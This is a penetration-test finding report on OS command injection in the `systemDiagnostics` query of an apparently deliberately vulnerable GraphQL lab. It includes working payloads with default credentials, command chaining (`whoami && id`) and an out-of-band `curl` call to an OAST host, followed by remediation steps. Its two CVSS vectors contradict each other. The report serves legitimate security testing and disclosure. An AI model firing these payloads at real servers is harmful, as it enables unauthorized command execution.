# DVGA-005. OS Command Injection via systemDiagnostics

## Severity

High

Score: 7.2 (High)

Vector: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CVSS Base Score:	        7.2
Impact Subscore:	        5.9
Exploitability Subscore:	1.2
CVSS Temporal Score:	    NA
CVSS Environmental Score:	NA
Modified Impact Subscore:	NA
Overall CVSS Score:	        7.2

## CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)

## OWASP Mapping

* OWASP Top 10 2021: A03 - Injection

## Affected Endpoints

* `POST /graphql`

## Affected Functionality

* GraphQL `systemDiagnostics` query

* `cmd` parameter

* System diagnostic functionality

## Description

During the Day-3 assessment, I discovered that the `systemDiagnostics` GraphQL query could be abused to run operating-system commands through the `cmd` parameter.

I first noticed this on Day-3, when I was able to run commands successfully. I did not report it separately at that time because it was part of the Day-3 assessment.

The `systemDiagnostics` query accepts a username, password, and command:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami")
}
```

The response was:

```json
{"data":{"systemDiagnostics":"dvga\n"}}
```

The returned `dvga` value is the output of the `whoami` command, confirming that the supplied command was executed by the application.

These were the results from the Day-3 assessment.

I later performed additional testing to confirm that this was genuine command execution and to understand how the functionality behaves.

First, I used a controlled Burp Collaborator/OAST endpoint and supplied the following command:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "curl http://6elo69a6fbcchamzv8z6cf7vamgd43ss.oastify.com")
}
```

The application returned:

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Mon, 31 Aug 2026 12:48:42 GMT
Ngrok-Agent-Ips: X
Content-Length: 88

{"data":{"systemDiagnostics":"<html><body>akdwpxxptxqxz11wq51n8vzjjgigz</body></html>"}}
```

The application returned the HTML response received from the controlled OAST endpoint. This confirmed that the supplied `curl` command was executed from the application server.

I then tested whether multiple commands could be executed using shell command chaining.

The following query was sent:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami && id")
}
```

The application returned:

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Mon, 31 Aug 2026 15:29:33 GMT
Ngrok-Agent-Ips: X
Content-Length: 88

{"data":{"systemDiagnostics":"dvga\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
```

The output was:

```text
dvga
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

This confirms that both `whoami` and `id` were executed successfully.

It also shows that the application is processing shell operators such as `&&`, rather than restricting the `cmd` parameter to a predefined set of diagnostic commands.

The commands were executed as:

```text
uid=1000(dvga)
gid=1000(dvga)
groups=1000(dvga)
```

Therefore, the command execution is currently running in the context of the `dvga` application user.

## Steps to Reproduce

### 1. Identify the systemDiagnostics Query

Send a request to the GraphQL `/graphql` endpoint and use the `systemDiagnostics` query:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami")
}
```

### 2. Confirm Command Execution

The application returns:

```json
{"data":{"systemDiagnostics":"dvga\n"}}
```

The returned `dvga` value confirms that the `whoami` command was executed on the server.

### 3. Test Command Chaining

Send the following query:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami && id")
}
```

The application returns:

```text
dvga
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

This confirms that more than one operating-system command can be executed through the parameter.

### 4. Perform Out-of-Band Validation

As an additional validation, send a controlled HTTP request through the `cmd` parameter:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "curl http://6elo69a6fbcchamzv8z6cf7vamgd43ss.oastify.com")
}
```

The application returned:

```html
<html><body>akdwpxxptxqxz11wq51n8vzjjgigz</body></html>
```

This response came from the controlled OAST endpoint, confirming that the command was executed server-side.

## Proof of Concept

### Direct Command Execution

The initial Day-3 test using:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami")
}
```

returned:

```text
dvga
```

This was the first confirmation that the `cmd` parameter could be used to execute an operating-system command.

### Command Chaining

The following test:

```graphql
query systemDiagnostics {
    systemDiagnostics(username: "admin", password: "changeme", cmd: "whoami && id")
}
```

returned:

```text
dvga
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

This confirmed that shell command chaining was also being processed.

### Burp Collaborator / OAST Validation

The following command was used for controlled out-of-band validation:

```text
curl http://6elo69a6fbcchamzv8z6cf7vamgd43ss.oastify.com
```

The application returned the content from the controlled endpoint:

```html
<html><body>akdwpxxptxqxz11wq51n8vzjjgigz</body></html>
```

This provides additional confirmation that the command was executed by the application server rather than the result being generated locally or returned from a fixed response.

### Screenshot Evidence

The screenshots captured during testing demonstrate:

* The `systemDiagnostics` query being tested.
* Successful execution of the `whoami` command.
* The Burp Collaborator/OAST validation.
* Successful execution of `whoami && id`.
* The returned `uid`, `gid`, and group information showing the execution context.

All evidence for this finding is stored in:

```text
evidence/DVGA-005-OS-Command-Injection-via-systemDiagnostics
```

### Evidence Contents

The evidence folder contains the request, response, and screenshot evidence collected during the testing process.

## Impact

An attacker who can access the `systemDiagnostics` functionality can execute operating-system commands on the underlying application server.

The commands were confirmed to be running as the `dvga` user:

```text
uid=1000(dvga)
gid=1000(dvga)
groups=1000(dvga)
```

The impact will depend on the permissions available to this account and what other services are accessible from the application environment.

An attacker could potentially:

* Execute commands on the application server.
* Read or modify files accessible to the `dvga` user.
* Access application configuration and other information available to the account.
* Make network requests from the application server.
* Interact with services reachable from the server.
* Use the command execution as a starting point for further compromise if other weaknesses are present.

The testing confirmed command execution, shell command chaining, and server-side outbound interaction.

I stopped the testing after confirming the command execution and execution context. A reverse shell was not required to demonstrate the vulnerability.

## Risk Rating

High

## Remediation

* Remove arbitrary command execution from the `systemDiagnostics` GraphQL query.

* If diagnostic functionality is required, replace the `cmd` parameter with an allowlist of predefined diagnostic operations.

* Do not pass user-controlled input directly to a shell.

* Avoid shell interpretation when executing legitimate system utilities.

* Apply appropriate authorization controls to the `systemDiagnostics` functionality.

* Make sure the diagnostic functionality is not exposed to users who do not require it.

* Run the application with the minimum operating-system privileges required.

* Restrict unnecessary outbound network access from the application environment.

* Log access to administrative diagnostic functionality and monitor for suspicious command-execution attempts.

## References

* CWE-78 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

* https://cwe.mitre.org/data/definitions/78.html

* OWASP Top 10 2021: A03 - Injection

* https://owasp.org/Top10/A03_2021-Injection/

* OWASP API Security Top 10 2023: API8 - Security Misconfiguration

* https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/

## Retest Status

Not Retested

Retesting should confirm that:

1. Commands supplied through the `cmd` parameter are no longer executed.

2. Shell operators such as `&&` are no longer interpreted.

3. The `systemDiagnostics` functionality only performs predefined operations, if it is retained.

4. Unauthorized users cannot access the functionality.

5. A controlled OAST request can no longer be triggered through the `cmd` parameter.

6. The application continues to run with the minimum operating-system privileges required.
